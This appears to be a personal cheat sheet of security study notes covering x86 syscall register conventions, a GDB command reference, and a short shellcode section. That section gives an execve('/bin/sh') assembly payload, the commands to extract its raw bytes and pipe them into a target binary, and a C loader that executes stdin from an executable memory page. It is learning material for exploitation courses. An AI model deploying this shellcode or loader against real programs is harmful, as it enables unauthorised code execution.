### Linux system call conventions x86-32 linux

`%eax, %ebx, %ecx, %edx, %esi, %edi, %ebp`

### Linux application call convention x86-64

`%rdi, %rsi, %rdx, %rcx, %r8, %r9`

The kernel interface uses `%rdi, %rsi, %rdx, %r10, %r8 and %r9` (syscalls)

```c
 * 64-bit SYSCALL saves rip to rcx, clears rflags.RF, then saves rflags to r11,
 * then loads new ss, cs, and rip from previously programmed MSRs.
 * rflags gets masked by a value from another MSR (so CLD and CLAC
 * are not needed). SYSCALL does not save anything on the stack
 * and does not change rsp.
 *
 * Registers on entry:
 * rax  system call number
 * rcx  return address
 * r11  saved rflags (note: r11 is callee-clobbered register in C ABI)
 * rdi  arg0
 * rsi  arg1
 * rdx  arg2
 * r10  arg3 (needs to be moved to rcx to conform to C ABI)
 * r8   arg4
 * r9   arg5
 * (note: r12-r15, rbp, rbx are callee-preserved in C ABI)
```

From: https://stackoverflow.com/a/18024743

### compile shellcode

```
.global _start
_start:
.intel_syntax noprefix
	mov rax, 59  # execve
	lea rdi, [rip+binsh]
	mov rsi, 0
	mov rdx, 0
	syscall
binsh:
	.string "/bin/sh"
```

`gcc -nostdlib -static shellcode.s -o shellcode-elf`
`objdump -M intel -o shellcode.elf`
`objcopy --dump-section .text=shellcode-raw shellcode-elf`
`hd shellcode-raw`
`(cat shellcode-raw; cat) | ./bin`

### shellcode loader (JIT)

```c
page = mmap(0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
read(0, page, 0x1000); // read from stdin 0x1000 bytes
((void(*)())page)();
```

#### Trace the syscalls

`strace ./shellcode-elf`

Source: Zardus, pwn.college, https://www.youtube.com/watch?v=715v_-YnpT8

### GDB

`x/nfu <address>`

Print memory:

n: how many units to print (default 1)

f: format character (like print)

u: unit (b: byte, h: half-world (two bytes), w: word (four bytes), g: giant word (eight bytes))

Example: `x/i $rip - get instruction at $rip`

#### Stack

`backtrace` - show callstack

`frame` - select stack frame

#### Watch/Break-points

`watch` - set watchpoint

`break` - set breakpoint

`delete` - delete breakpoint

`clear` - delete all breakpoints

`enable` - enable disabled breakpoint

`disable` - disable breakpoint

#### Stepping into/out of functions

`step` - step into next function

`next` - step out (go to next source line but don't dive into functions)

`finish` - continue until current function returns

`continue` - continue normal execution

#### Arguments and program execution

`set args` - pass args to program

`run` - run program

`kill` - kill the running program

#### Disassembling

`disassemble / disassemble <address>` - disass the current function or given loc

`handle <signal> <options>`

set how to handle signals:
options: - (no)print - print/no a message when signals occur - (no)stop - stop/no the program when signals occurs - (no)pass - pass/no the signal to the program

#### Display information about various

`info args` - print arguments to the function of the current stack frame

`info breakpoints` - print watchpoints and breakpoints

`info display` - print info about displays

`info locals` - print the local variables in the stack frame

`info sharedlibrary` - list all shared libraries

`info signals` - list all signals and how they're currently handled

`info threads` - list all threads

#### Get variable type

`whatis variable_name` - print type of named variable

#### Single instruction stepping

`si` - step into instruction (follow call instructions)

`ni` - step one instruction over

Source: https://sourceware.org/gdb/current/onlinedocs/gdb/Reverse-Execution.html

#### Reverse execution stepping

`reverse-step [count]` - reverse until it reaches start of a different source line

`reverse-stepi [count]` - reverse one mach instruction at a time

`reverse-next [count]` - run backward to the beginning of previous line executed in the innermost stack frame

`reverse-nexti [count]` - execute a single machine instruction in reverse

#### Reverse execution program

`reverse-finish` - takes you to the point where the function was called

`reverse-continue | rc` - beginning at the point where the program last stopped

#### Control execution direction

`set exec-direction [forward|reverse]` - change execution order
